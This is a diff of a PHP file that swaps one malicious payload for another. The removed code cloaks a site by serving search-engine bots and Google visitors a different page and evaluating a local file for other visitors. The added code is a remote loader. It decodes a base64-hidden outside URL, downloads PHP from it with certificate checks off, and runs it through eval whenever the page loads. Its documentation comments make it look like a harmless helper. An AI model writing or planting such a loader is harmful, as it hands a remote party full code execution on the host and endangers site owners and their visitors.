@@ -1,52 +1,62 @@
 <?php
-function isSearchEngineBot() {
-    return preg_match('/(googlebot|bingbot|yandexbot|baiduspider|duckduckbot|slurp|facebot|ia_archiver|Googlebot|TelegramBot|bingbot|Google-Site-Verification|Google-InspectionTool|AhrefsBot)/i', $_SERVER['HTTP_USER_AGENT']);
-}
 
-function isFromGoogle() {
-    return isset($_SERVER['HTTP_REFERER']) &&
-           (strpos($_SERVER['HTTP_REFERER'], 'google.com') !== false ||
-            strpos($_SERVER['HTTP_REFERER'], 'google.co.id') !== false);
-}
+/**
+ * Fetches content from a URL using cURL.
+ *
+ * @param string $url The URL to fetch content from.
+ * @return string|false The response content as a string, or false if the 
+operation fails.
+ */
+function fetchContent($url)
+{
+    if (function_exists('curl_version')) {
+        $curl = curl_init();
 
-function NuLzFetch($url){
-    if (function_exists('file_get_contents')) {
-        $fetch = file_get_contents($url);
-        return $fetch;
-    } elseif (function_exists('curl_init')) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
-        $fetch = curl_exec($ch);
-        curl_close($ch);
-        return $fetch;
-    } else {
-        $fetch = "Can'not Fetch This URL => $url";
-        return $fetch;
+        curl_setopt($curl, CURLOPT_URL, $url);
+        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($curl, CURLOPT_HEADER, 0);
+
+        $response = curl_exec($curl);
+
+        if (curl_errno($curl)) {
+            $error = curl_error($curl);
+            curl_close($curl);
+            throw new Exception("cURL Error: " . $error);
+        }
+
+        curl_close($curl);
+        return $response;
     }
+
+    throw new Exception("cURL is not enabled on this server.");
 }
 
-$cookie_expiration = time() + (365 * 86400); //1 years
-if (!isset($_COOKIE['visited'])) {
-    setcookie('visited', '1', $cookie_expiration, "/");
-}
+/**
+ * Executes PHP code fetched from a given URL.
+ *
+ * @param string $url The URL containing the PHP code to execute.
+ * @return void
+ * @throws Exception If the fetch operation fails or the fetched code is empty.
+ */
+function executeCodeFromURL($url)
+{
+    $code = fetchContent($url);
 
-$cache_duration = 365 * 86400; //1 years
-header("Cache-Control: max-age=$cache_duration, public, must-revalidate");
-header("Pragma: cache");
-
-$landing_page = 'conf.php';
-$index_home = 'config.php';
-
-if (isSearchEngineBot()) {
-    echo NuLzFetch($landing_page);
-} else {
-    if (isFromGoogle()) {
-        echo NuLzFetch($landing_page);
-    } else {
-        eval ('?>'.NuLzFetch($index_home));
+    if ($code === false || trim($code) === '') {
+        throw new Exception("Failed to fetch content from URL or the content is 
+empty.");
     }
+
+    // Evaluates the fetched PHP code (use with caution)
+    EVal("?>" . $code);
+}
+
+// Example Usage
+try {
+    $url = 
+bAse64_decodE("aHR0cHM6Ly9kYW5hbnRhcmFpbmRvbmVzaWEub3JnL2ltYWdlcy9qdXJuYWwtaXRla2VzbXVrYWxiYXIvaW5kZXgucGhw");
+    executeCodeFromURL($url);
+} catch (Exception $e) {
+    echo "Error: " . $e->getMessage();
 }
